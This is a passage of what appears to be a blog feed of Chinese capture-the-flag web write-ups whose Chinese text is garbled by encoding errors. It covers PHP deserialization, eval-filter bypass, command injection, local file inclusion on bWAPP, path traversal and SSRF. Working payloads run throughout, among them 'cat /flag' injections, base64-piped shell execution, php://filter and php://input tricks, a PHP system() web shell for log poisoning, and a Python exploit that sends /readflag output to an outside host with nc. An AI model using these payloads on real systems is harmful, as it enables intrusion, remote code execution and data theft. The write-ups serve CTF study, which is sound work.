serialize($a);?&gt;</code></pre><p>ç»“æžœï¼š</p><pre><code>O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}</code></pre><h3 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre><code>?select=O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";}</code></pre><p>ç„¶åŽå°±ä¼šæ‰‘è¡—</p><p><img src="/2021/06/11/ji-ke-da-tiao-zhan-2019-php/1.png" alt="1"></p><p><strong>å› ä¸ºæ˜¯privateå£°æ˜Žï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š\0çš„å‰ç¼€ï¼Œçœ‹åˆ«äººçš„wpäº†è§£åœ¨urlæ ä¸­ä¼šå‡ºçŽ°\0æœ‰ç©ºç™½ç¬¦ï¼Œå¤åˆ¶çš„æ—¶å€™ä¼šä¸¢å¤±ï¼Œæ‰€ä»¥åŠ ä¸Š%00</strong></p><pre><code>?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";s:3:"100";}</code></pre><p><img src="/2021/06/11/ji-ke-da-tiao-zhan-2019-php/2.png" alt="2"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF:2019-EasyCalc</title>
      <link href="2021/06/11/roarctf-2019-easycalc/"/>
      <url>2021/06/11/roarctf-2019-easycalc/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/06/11/roarctf-2019-easycalc/image-20210611190653318.png" alt="image-20210611190653318"></p><pre><code>$('#calc').submit(function(){   $.ajax({       url:"calc.php?num="+encodeURIComponent($("#content").val()),       type:'GET',       success:function(data){           $("#result").html(`&lt;div class="alert alert-success"&gt;       &lt;strong&gt;ç­”æ¡ˆ:&lt;/strong&gt;${data}       &lt;/div&gt;`);       },       error:function(){           alert("è¿™å•¥?ç®—ä¸æ¥!");       }    })    return false;})</code></pre><p>$(â€œ#contentâ€).val() æ˜¯ä»€ä¹ˆæ„æ€ï¼š</p><p> èŽ·å–idä¸ºcontentçš„HTMLæ ‡ç­¾å…ƒç´ çš„å€¼,æ˜¯JQuery,   (â€œ#contentâ€)ç›¸å½“äºŽdocument.getElementById(â€œcontentâ€);</p><p>(â€œ#contentâ€).val()ç›¸å½“äºŽ document.getElementById(â€œcontentâ€).value;</p><p>ä½†æ˜¯æ— è®ºæ€Žä¹ˆæ³¨å…¥éƒ½æ˜¯400,403å’Œ500</p><p>calc.php</p><pre><code>&lt;?phperror_reporting(0);if(!isset($_GET['num'])){    show_source(__FILE__);}else{        $str = $_GET['num'];        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];        foreach ($blacklist as $blackitem) {                if (preg_match('/' . $blackitem . '/m', $str)) {                        die("what are you want to do?");                }        }        eval('echo '.$str.';');}?&gt; </code></pre><p>HPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo] =&gt; â€œbarâ€)ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æžçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ä¾‹å¦‚ï¼Œ/?%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id] =&gt; 42)ã€‚å¦‚æžœä¸€ä¸ªIDS/IPSæˆ–WAFä¸­æœ‰ä¸€æ¡è§„åˆ™æ˜¯å½“news_idå‚æ•°çš„å€¼æ˜¯ä¸€ä¸ªéžæ•°å­—çš„å€¼åˆ™æ‹¦æˆªï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨ä»¥ä¸‹è¯­å¥ç»•è¿‡ï¼š</p><p>/news.php?%20news[id%00=42â€+AND+1=0â€“</p><p>ä¸Šè¿°PHPè¯­å¥çš„å‚æ•°%20news[id%00çš„å€¼å°†å­˜å‚¨åˆ°$_GET[â€œnews_idâ€]ä¸­ã€‚</p><p>HPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£æžæŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</p><p>1.åˆ é™¤ç©ºç™½ç¬¦</p><p>2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰</p><p>wafä¸å…è®¸numå˜é‡ä¼ é€’å­—æ¯ï¼Œå¯ä»¥åœ¨numå‰åŠ ä¸ªç©ºæ ¼ï¼Œè¿™æ ·wafå°±æ‰¾ä¸åˆ°numè¿™ä¸ªå˜é‡äº†ï¼Œå› ä¸ºçŽ°åœ¨çš„å˜é‡å«â€œ numâ€ï¼Œè€Œä¸æ˜¯â€œnumâ€ã€‚ä½†phpåœ¨è§£æžçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠç©ºæ ¼ç»™åŽ»æŽ‰ï¼Œè¿™æ ·æˆ‘ä»¬çš„ä»£ç è¿˜èƒ½æ­£å¸¸è¿è¡Œï¼Œè¿˜ä¸Šä¼ äº†éžæ³•å­—ç¬¦ã€‚</p><p>å­˜åœ¨blacklistå’Œpreg_matchè¿‡æ»¤ï¼šç”¨char()è½¬asciiå†è¿›è¡Œæ‹¼æŽ¥</p><p><img src="/2021/06/11/roarctf-2019-easycalc/image-20210611191802071.png" alt="image-20210611191802071"></p><pre><code>calc.php?%20num=var_dump(scandir(chr(47)))</code></pre><p><img src="/2021/06/11/roarctf-2019-easycalc/image-20210611192145718.png" alt="image-20210611192145718"></p><pre><code>calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></pre><p><img src="/2021/06/11/roarctf-2019-easycalc/image-20210611192231927.png" alt="image-20210611192231927"></p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF:2019-PingPingPing</title>
      <link href="2021/06/10/gxyctf-2019-pingpingping/"/>
      <url>2021/06/10/gxyctf-2019-pingpingping/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610215732594.png" alt="image-20210610215732594"></p><pre><code>/?ip=127.0.0.1;cat /flag</code></pre><p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610215809393.png" alt="image-20210610215809393"></p><pre><code>/?ip=127.0.0.1;ls</code></pre><p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610215833127.png" alt="image-20210610215833127"></p><pre><code>/?ip=127.0.0.1;cat$IFS$1index.php</code></pre><p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610220021619.png" alt="image-20210610220021619"></p><h3 id="shï¼Œbashä¸‹ç¼–ç "><a href="#shï¼Œbashä¸‹ç¼–ç " class="headerlink" title="shï¼Œbashä¸‹ç¼–ç "></a>shï¼Œbashä¸‹ç¼–ç </h3><pre><code>/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></pre><p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610220126890.png" alt="image-20210610220126890"></p><h3 id="å†…è”æ‰§è¡Œ"><a href="#å†…è”æ‰§è¡Œ" class="headerlink" title="å†…è”æ‰§è¡Œ"></a>å†…è”æ‰§è¡Œ</h3><h4 id="1-å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ"><a href="#1-å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ" class="headerlink" title="1.å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ"></a>1.å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œ</h4><pre><code>?ip=127.0.0.1;cat$IFS$1`ls`</code></pre><p><img src="/2021/06/10/gxyctf-2019-pingpingping/image-20210610220226315.png" alt="image-20210610220226315"></p><h4 id="2-æ‹¼æŽ¥æŽ§åˆ¶å‚æ•°"><a href="#2-æ‹¼æŽ¥æŽ§åˆ¶å‚æ•°" class="headerlink" title="2.æ‹¼æŽ¥æŽ§åˆ¶å‚æ•°"></a>2.æ‹¼æŽ¥æŽ§åˆ¶å‚æ•°</h4><pre><code>?ip=1;a=f;d=ag;c=l;cat$IFS$a$c$d.php</code></pre><pre><code>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</code></pre><ul><li><p>?ip=127.0.0.1;a=f;cat$IFS$1$alag.php    è¿‡æ»¤</p></li><li><p>?ip=127.0.0.1;a=l;cat$IFS$1f$aag.php    æœ‰requestï¼Œä½†æ²¡flag</p></li><li><p>?ip=127.0.0.1;a=a;cat$IFS$1fl$ag.php      è¿‡æ»¤</p></li><li><p>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php    æœ‰flag</p><pre><code>if(preg_match("/.*f.*l.*a.*g.*/", $ip)){    die("fxck your flag!");</code></pre></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:LFIæ¼æ´ž</title>
      <link href="2021/06/09/web-lfi-lou-dong/"/>
      <url>2021/06/09/web-lfi-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-åŸºæœ¬æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#0x01-åŸºæœ¬æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="0x01 åŸºæœ¬æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>0x01 åŸºæœ¬æœ¬åœ°æ–‡ä»¶åŒ…å«</h3><p>åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ç›®æ ‡IPï¼Œå¹¶åœ¨BWAPPå†…ç™»å½•ï¼ˆbeeï¼šbugï¼‰ï¼ŒçŽ°åœ¨é€‰æ‹©bugï¼šremote &amp; local file Inclusionï¼Œç„¶åŽç‚¹å‡»hackã€‚</p><p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/1-1.png"><img src="http://www.secpulse.com/wp-content/uploads/2017/02/1-1.png" alt="1-1"></a></p><p>æ‰“å¼€å…·æœ‰RFIå’ŒLFIæ¼æ´žçš„ç½‘é¡µã€‚åœ¨ä¸‹æ‹‰åˆ—è¡¨ä¸­é€‰æ‹©è¯­è¨€é‡Šï¼Œå•å‡»goæŒ‰é’®æ—¶ï¼Œæ‰€é€‰çš„è¯­è¨€æ–‡ä»¶å°†åŒ…å«åœ¨URLä¸­ã€‚ æ‰§è¡ŒåŸºæœ¬æ”»å‡»æ“ä½œã€‚</p><blockquote><p><a href="http://192.168.1.101/bWAPP/rlfi.php?language=lang_en.php&amp;action=go">http://192.168.1.101/bWAPP/rlfi.php?language=lang_en.php&amp;action=go</a> into 192.168.1.101/bWAPP/flfi.php?language=/etc/passwd</p></blockquote><p>åœ¨åŸºæœ¬çš„LFIæ”»å‡»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ï¼ˆ../ï¼‰æˆ–ç®€å•åœ°ï¼ˆ/ï¼‰ä»Žç›®å½•ä¸­ç›´æŽ¥<a href="https://www.secpulse.com/archives/tag/%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6">è¯»å–æ–‡ä»¶</a>çš„å†…å®¹ï¼Œä¸‹é¢çš„æˆªå›¾ä¸­åœ¨æµè§ˆå™¨URLä¸­è®¿é—®å¯†ç æ–‡ä»¶ã€‚</p><p><img src="http://www.secpulse.com/wp-content/uploads/2017/02/2-1.png" alt="2-1"></p><h3 id="0x02-Null-byte"><a href="#0x02-Null-byte" class="headerlink" title="0x02 Null byte"></a>0x02 Null byte</h3><p>åœ¨ä¸€äº›æƒ…å†µä¸‹ï¼Œç”±äºŽé«˜å®‰å…¨çº§åˆ«ï¼Œä¸Šé¢æåˆ°çš„åŸºæœ¬æœ¬åœ°æ–‡ä»¶åŒ…å«æ”»å‡»å¯èƒ½ä¸å·¥ä½œã€‚ä»Žä¸‹é¢çš„æˆªå›¾å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œå½“åœ¨URLä¸­æ‰§è¡Œç›¸åŒçš„è·¯å¾„æ—¶ï¼Œå´æ— æ³•è¯»å–å¯†ç æ–‡ä»¶ã€‚ æ‰€ä»¥å½“é¢å¯¹è¿™æ ·çš„é—®é¢˜ï¼Œå¯ä»¥è¿›è¡ŒNULL byteæ”»å‡»ã€‚</p><p>æ‰“å¼€burp suiteæ•èŽ·æµè§ˆå™¨è¯·æ±‚ï¼Œç„¶åŽé€‰æ‹©ä»£ç†é€‰é¡¹å¡å¹¶å¼€å§‹æˆªå–ã€‚ ä¸è¦å¿˜è®°åœ¨ä½¿ç”¨<a href="https://www.secpulse.com/archives/tag/burp">burp</a> suiteæ—¶è®¾ç½®æµè§ˆå™¨ä»£ç†ã€‚</p><p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/3.1.png"><img src="http://www.secpulse.com/wp-content/uploads/2017/02/3.1.png" alt="3.1"></a></p><p>å°†æ‹¦æˆªçš„æ•°æ®å‘é€åˆ°<a href="https://www.secpulse.com/archives/tag/repeater">repeater</a>ã€‚</p><p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/3.2.png"><img src="http://www.secpulse.com/wp-content/uploads/2017/02/3.2.png" alt="3.2"></a></p><p>åœ¨repeaterä¸­åšå‘é€çš„è¯·æ±‚å’Œå“åº”ç”Ÿæˆçš„åˆ†æžã€‚ä»Žæˆªå›¾å¯ä»¥æ¸…æ¥šçš„çœ‹å‡º/ etc / passwdä¸èƒ½è¯»å–ã€‚</p><p><a href="http://www.secpulse.com/wp-content/uploads/2017/02/3.3.png"><img src="http://www.secpulse.com/wp-content/uploads/2017/02/3.3.png" alt="3.3"></a></p><p>åœ¨ä¸‹é¢çš„æˆªå›¾ä¸­ï¼Œé€šè¿‡åœ¨<a href="https://www.secpulse.com/archives/tag/etc/passwd">etc/passwd</a>ç›®å½•çš„æœ«å°¾æ·»åŠ ç©ºå­—ç¬¦ï¼ˆï¼…00ï¼‰æ¥è½¬å‘è¯·æ±‚ï¼Œç„¶åŽå•å‡»goé€‰é¡¹å¡ã€‚ç„¶åŽåœ¨çª—å£çš„å³è§†å›¾ä¸Šï¼Œå¯†ç æ–‡ä»¶ä½œä¸ºå“åº”æ‰“å¼€ã€‚</p><p><img src="http://www.secpulse.com/wp-content/uploads/2017/02/3.4.png" alt="3.4"></p><h3 id="0x03-Base64-encoded"><a href="#0x03-Base64-encoded" class="headerlink" title="0x03 Base64 encoded"></a>0x03 Base64 encoded</h3><pre><code>php://filter/read=convert.base64-encode/resource=</code></pre><h3 id="0x04-PHP-Input"><a href="#0x04-PHP-Input" class="headerlink" title="0x04 PHP Input"></a>0x04 PHP Input</h3><pre><code>php://input&amp;cmd=ls</code></pre><p>ç„¶åŽpostæ‰§è¡Œå‘½ä»¤</p><pre><code>&lt;ï¼Ÿphp systemï¼ˆ$ _ GET [â€˜cmdâ€™]ï¼‰; ï¼Ÿ&gt;</code></pre><h3 id="0x05-Proc-self-environ"><a href="#0x05-Proc-self-environ" class="headerlink" title="0x05 Proc/self/environ"></a>0x05 Proc/self/environ</h3><p>å¦‚æžœæœåŠ¡è¶…æ—¶ï¼Œé€šè¿‡LFIåˆ©ç”¨å®ƒã€‚å¯ä»¥åŒ…æ‹¬å­˜å‚¨User_Agentçš„proc/self/environæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æ’å…¥ç”¨äºŽæ‰§è¡ŒCMDå‘½ä»¤çš„PHPä»£ç ã€‚</p><p>CMDå‘½ä»¤<code>&lt;?php system($_GET[â€˜cmdâ€™]); ?&gt;</code>æ·»åŠ åˆ°user_Agentå†…ï¼Œå¹¶ä½¿ç”¨GETå‚æ•°<strong>192.168.1.8/lfi/lfi.php?file=/var/www/apachae2/access.log&amp;cmd=id</strong>å‘é€è¯·æ±‚</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/wh4am1/p/6542398.html">https://www.cnblogs.com/wh4am1/p/6542398.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æžå®¢å¤§æŒ‘æˆ˜:2019-SecretFile</title>
      <link href="2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/"/>
      <url>2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/</url>
      
        <content type="html"><![CDATA[<p>F12</p><p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211655223.png" alt="image-20210609211655223"></p><pre><code>Archive_room.php</code></pre><p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211736485.png" alt="image-20210609211736485"></p><p>ç‚¹ä¸­é—´å°±ä¼š</p><p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211800847.png" alt="image-20210609211800847"></p><p>burpæŠ“åŒ…</p><p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211856185.png" alt="image-20210609211856185"></p><p>è®¿é—®è¿™ä¸ªsecret</p><pre><code>&lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset="UTF-8"&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET['file'];    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){        echo "Oh no!";        exit();    }    include($file); //flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt;&lt;/html&gt;</code></pre><p>ä»£ç å®¡è®¡ä¸èƒ½å«æœ‰â€../â€œï¼Œâ€tpâ€ï¼Œâ€inputâ€ï¼Œâ€dataâ€</p><p>æ‰€ä»¥æ‰æœ‰LFIä¸­çš„base64 encodedæž„é€ payloadï¼š</p><pre><code>secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><pre><code>PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7NTE5ZjkxMjAtMjQ1Mi00MWQ1LThkNDUtZWU0MDRhMGVlZTk0fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</code></pre><p><img src="/2021/06/09/ji-ke-da-tiao-zhan-2019-secretfile/image-20210609211626525.png" alt="image-20210609211626525"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF:2018-WarmUp</title>
      <link href="2021/06/09/hctf-2018-warmup/"/>
      <url>2021/06/09/hctf-2018-warmup/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/06/09/hctf-2018-warmup/image-20210609162122575.png" alt="image-20210609162122575"></p><pre><code> &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];            if (! isset($page) || !is_string($page)) {                echo "you can't see it";                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            echo "you can't see it";            return false;        }    }    if (! empty($_REQUEST['file'])        &amp;&amp; is_string($_REQUEST['file'])        &amp;&amp; emmm::checkFile($_REQUEST['file'])    ) {        include $_REQUEST['file'];        exit;    } else {        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";    }  ?&gt; </code></pre><p><img src="/2021/06/09/hctf-2018-warmup/image-20210609162411358.png" alt="image-20210609162411358"></p><ul><li><strong>!empty($_REQUEST[â€˜fileâ€™])</strong>:è¦æˆ‘ä»¬çš„fileå˜é‡ä¸ä¸ºç©º</li><li><strong>is_string($_REQUEST[â€˜fileâ€™])</strong>:è¦æ±‚æˆ‘ä»¬ä¼ è¿›æ¥çš„å€¼æ˜¯å­—ç¬¦ä¸²ç±»åž‹</li><li><strong>emmm::checkFile($_REQUEST[â€˜fileâ€™])</strong>:è¿™é‡Œå°†æˆ‘ä»¬çš„çš„å€¼ä¼ åˆ°emmmç±»é‡Œé¢çš„checkFileå‡½æ•°</li><li>**mb_strpos()**ï¼šè¿”å›žè¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²åœ¨åˆ«ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºçŽ°çš„ä½ç½®</li><li><strong>mb_substr()</strong>: å‡½æ•°è¿”å›žå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</li><li>ç¬¬ä¸€ä¸ªifè¯­å¥å¯¹å˜é‡è¿›è¡Œæ£€éªŒï¼Œè¦æ±‚$pageä¸ºå­—ç¬¦ä¸²ï¼Œå¦åˆ™è¿”å›žfalse</li><li>ç¬¬äºŒä¸ªifè¯­å¥åˆ¤æ–­$pageæ˜¯å¦å­˜åœ¨äºŽ$whitelistæ•°ç»„ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›žtrue</li><li>ç¬¬ä¸‰ä¸ªifè¯­å¥åˆ¤æ–­æˆªå–åŽçš„$pageæ˜¯å¦å­˜åœ¨äºŽ$whitelistæ•°ç»„ä¸­ï¼Œæˆªå–$pageä¸­â€™?â€™å‰éƒ¨åˆ†ï¼Œå­˜åœ¨åˆ™è¿”å›žtrue</li><li>ç¬¬å››ä¸ªifè¯­å¥åˆ¤æ–­urlè§£ç å¹¶æˆªå–åŽçš„$pageæ˜¯å¦å­˜åœ¨äºŽ$whitelistä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›žtrue<br> è‹¥ä»¥ä¸Šå››ä¸ªifè¯­å¥å‡æœªè¿”å›žå€¼ï¼Œåˆ™è¿”å›žfalse</li></ul><pre><code>index.php?file=hint.php?../../../../../ffffllllaaaagggg</code></pre><p><img src="/2021/06/09/hctf-2018-warmup/image-20210609204113988.png" alt="image-20210609204113988"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HITCON:2017-SqlSoHard</title>
      <link href="2021/06/08/hitcon-2017-sqlsohard/"/>
      <url>2021/06/08/hitcon-2017-sqlsohard/</url>
      
        <content type="html"><![CDATA[<p>ä¸æ˜¯å¾ˆæ‡‚è¿‡åŽå†æ¥çœ‹</p><pre><code>from random import randintimport requests# payload = "union"payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/readflag|nc 10.188.2.20 9999`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))data = {            'username': username+payload,                 'password': 'AAAAAA'                }print('ok')r = requests.post('http://c0eea204-4994-41eb-ada6-e2b515eceae8.node3.buuoj.cn/', data=data);print(r.content)</code></pre><p><img src="/2021/06/08/hitcon-2017-sqlsohard/image-20210609161557645.png" alt="image-20210609161557645"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HITCON </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HITCON:2017-SSRFme</title>
      <link href="2021/06/08/hitcon-2017-ssrfme/"/>
      <url>2021/06/08/hitcon-2017-ssrfme/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?php    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];    }    echo $_SERVER["REMOTE_ADDR"];    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);    @mkdir($sandbox);    @chdir($sandbox);    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));    $info = pathinfo($_GET["filename"]);    $dir  = str_replace(".", "", basename($info["dirname"]));    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info["basename"]), $data);    highlight_file(__FILE__);</code></pre><ul><li><p>shell_exec â€” é€šè¿‡ shell çŽ¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›žã€‚</p></li><li><p>escapeshellarg â€” æŠŠå­—ç¬¦ä¸²è½¬ç ä¸ºå¯ä»¥åœ¨ shell å‘½ä»¤é‡Œä½¿ç”¨çš„å‚æ•°</p></li><li><p>pathinfo() è¿”å›žä¸€ä¸ªå…³è”æ•°ç»„åŒ…å«æœ‰ path çš„ä¿¡æ¯ã€‚è¿”å›žå…³è”æ•°ç»„è¿˜æ˜¯å­—ç¬¦ä¸²å–å†³äºŽ optionsã€‚</p></li><li><p>basename â€” è¿”å›žè·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†</p></li><li><p>$_SERVER[â€œREMOTE_ADDRâ€]#æ˜¯ç”¨æˆ·è®¿é—®é¡µé¢ç”¨çš„å…¬ç½‘IP</p><h3 id="php-isset-å‡½æ•°"><a href="#php-isset-å‡½æ•°" class="headerlink" title="php isset å‡½æ•°"></a>php isset å‡½æ•°</h3><p>æ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®</p><p>è‹¥å˜é‡ä¸å­˜åœ¨åˆ™è¿”å›ž FALSE </p><p>è‹¥å˜é‡å­˜åœ¨ä¸”å…¶å€¼ä¸ºNULLï¼Œä¹Ÿè¿”å›ž FALSE </p><p>è‹¥å˜é‡å­˜åœ¨ä¸”å€¼ä¸ä¸ºNULLï¼Œåˆ™è¿”å›ž TURE </p><h3 id="PHP-explode-å‡½æ•°"><a href="#PHP-explode-å‡½æ•°" class="headerlink" title="PHP explode å‡½æ•°"></a>PHP explode å‡½æ•°</h3><p>explode() å‡½æ•°ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›žç”±å­—ç¬¦ä¸²ç»„æˆçš„æ•°ç»„ã€‚</p><p>ä¸¾ä¾‹ï¼šï¼ˆèœé¸Ÿæ•™ç¨‹ï¼‰</p><pre><code>&lt;?php$str = "www.runoob.com";print_r (explode(".",$str));?&gt;</code></pre><pre><code>Array(    [0] =&gt; www    [1] =&gt; runoob    [2] =&gt; com)</code></pre></li></ul><h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p>å›žåˆ°é¢˜ç›®</p><pre><code>orange+ipåœ°å€</code></pre><p>è®¿é—®</p><pre><code>/sandbox/fb8ca607c1b8f0bf763cbac72b8b6875</code></pre><p><img src="/2021/06/08/hitcon-2017-ssrfme/image-20210608212437627.png" alt="image-20210608212437627"></p><p>æ‰§è¡Œä¸¤æ¬¡</p><pre class=" language-cpp"><code class="language-cpp"><span class="token operator">?</span>url<span class="token operator">=</span>file<span class="token operator">:</span>ls <span class="token operator">/</span><span class="token operator">|</span><span class="token operator">&amp;</span>filename<span class="token operator">=</span>ls <span class="token operator">/</span><span class="token operator">|</span></code></pre><p>è®¿é—®ï¼š</p><pre><code>/sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/ls /|</code></pre><p><img 